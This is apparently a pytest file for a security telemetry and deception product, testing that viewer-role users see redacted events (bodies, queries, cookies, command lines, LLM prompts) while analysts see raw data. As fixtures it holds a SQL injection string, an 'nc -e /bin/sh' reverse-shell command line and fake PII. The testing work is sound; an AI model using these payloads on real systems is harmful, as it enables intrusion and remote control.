"""Viewers get a masked projection of raw telemetry (audit #157, repro L17-02).

The repro: a viewer JWT read ``request_body`` with form fields (e-mail, phone, name) via GET /events while the
LLM call detail with the same content was admin-only. Every API that returns stored events is covered:
events list/detail, session detail, alert evidence and deception trips.
"""

from __future__ import annotations

from collections.abc import Callable
from typing import Any

import httpx

from tokiwa.api.visibility import REDACTED, mask_event
from tokiwa.schemas.events import Event, EventKind, LLMAppInfo, NetworkInfo, ProcessInfo

PII_BODY = "username=hanako.fake%40example.com&tel=090-1234-5678&name=Yamada+Hanako"
PII_QUERY = "id=1' OR '1'='1&email=hanako.fake@example.com"
IP = "198.51.100.77"


def _assert_masked(ev: dict[str, Any]) -> None:
    http = ev["http"]
    assert http["request_body"] == REDACTED and http["query"] == REDACTED
    assert http["headers"]["cookie"] == REDACTED
    assert http["headers"]["user-agent"].startswith("Mozilla")  # non-sensitive header kept
    assert http["path"] and http["method"] and ev["source"]["ip"] == IP  # triage context kept
    assert "hanako" not in str(ev).lower() and "090-1234" not in str(ev)


def _assert_raw(ev: dict[str, Any]) -> None:
    assert ev["http"]["request_body"] == PII_BODY


async def _ingest(client: httpx.AsyncClient, headers: dict[str, str], *events: Event) -> None:
    body = {"events": [e.model_dump(mode="json", exclude_none=True) for e in events]}
    r = await client.post("/api/v1/ingest/events", json=body, headers=headers)
    assert r.status_code == 200, r.text


async def test_viewer_sees_masked_events_everywhere(
    client: httpx.AsyncClient,
    role_headers: dict[str, dict[str, str]],
    ingest_headers: dict[str, str],
    make_http_event: Callable[..., Event],
) -> None:
    viewer, analyst = role_headers["viewer"], role_headers["analyst"]
    cookie_headers = {"user-agent": "Mozilla/5.0 test", "cookie": "sid=hanako-secret-session"}
    sqli = make_http_event(
        "/login", method="POST", ip=IP, query=PII_QUERY, body=PII_BODY, headers=cookie_headers
    )
    decoy = make_http_event("/.env", ip=IP, query=PII_QUERY, body=PII_BODY, headers=cookie_headers)
    await _ingest(client, ingest_headers, sqli, decoy)

    # events list + detail
    lst = await client.get("/api/v1/events", params={"source_ip": IP}, headers=viewer)
    assert lst.status_code == 200 and lst.json()["total"] == 2
    for ev in lst.json()["items"]:
        _assert_masked(ev)
    one = (await client.get(f"/api/v1/events/{sqli.id}", headers=viewer)).json()
    _assert_masked(one)
    _assert_raw((await client.get(f"/api/v1/events/{sqli.id}", headers=analyst)).json())
    for ev in (await client.get("/api/v1/events", params={"source_ip": IP}, headers=analyst)).json()["items"]:
        _assert_raw(ev)

    # session detail (sessions list itself carries no bodies)
    sessions = (await client.get("/api/v1/sessions", params={"source_ip": IP}, headers=viewer)).json()
    assert sessions["total"] >= 1
    detail = (await client.get(f"/api/v1/sessions/{sessions['items'][0]['id']}", headers=viewer)).json()
    assert detail["events"]
    for ev in detail["events"]:
        _assert_masked(ev)
    assert detail["timeline"]  # still drawable
    analyst_detail = (
        await client.get(f"/api/v1/sessions/{sessions['items'][0]['id']}", headers=analyst)
    ).json()
    _assert_raw(analyst_detail["events"][0])

    # alert evidence
    alerts = (await client.get("/api/v1/alerts", params={"source_ip": IP}, headers=viewer)).json()["items"]
    assert alerts, "the SQLi / decoy request should raise at least one alert"
    for a in alerts:
        evidence = (await client.get(f"/api/v1/alerts/{a['id']}", headers=viewer)).json()["evidence"]
        assert evidence
        for ev in evidence:
            _assert_masked(ev)
    evidence = (await client.get(f"/api/v1/alerts/{alerts[0]['id']}", headers=analyst)).json()["evidence"]
    _assert_raw(evidence[0])

    # deception trips
    trips = (await client.get("/api/v1/deception/trips", params={"source_ip": IP}, headers=viewer)).json()
    assert trips["total"] >= 1, "the /.env decoy is seeded by default"
    for ev in trips["items"]:
        _assert_masked(ev)


def test_mask_event_covers_non_http_fields() -> None:
    ev = Event(
        kind=EventKind.PROCESS,
        dataset="host.process",
        message='127.0.0.1 - - "GET /reset?token=abc HTTP/1.1" 200',
        process=ProcessInfo(name="curl", cmdline="curl -H 'Authorization: Bearer s3cr3t' https://x"),
        network=NetworkInfo(process=ProcessInfo(cmdline="nc -e /bin/sh 10.0.0.1 4444")),
        llm_app=LLMAppInfo(app="chat", prompt="my card is 4111 1111 1111 1111"),
        raw={"line": "secret"},
    )
    m = mask_event(ev)
    assert m.message == REDACTED and m.raw is None
    assert m.process is not None and m.process.cmdline == REDACTED and m.process.name == "curl"
    assert m.network is not None and m.network.process is not None and m.network.process.cmdline == REDACTED
    assert m.llm_app is not None and m.llm_app.prompt == REDACTED and m.llm_app.app == "chat"
    assert ev.process is not None and ev.process.cmdline.startswith("curl")  # input untouched
    gate = Event(kind=EventKind.HTTP, dataset="gate.http", message="GET /login -> 200")
    assert mask_event(gate).message == "GET /login -> 200"  # gate messages carry no query/body
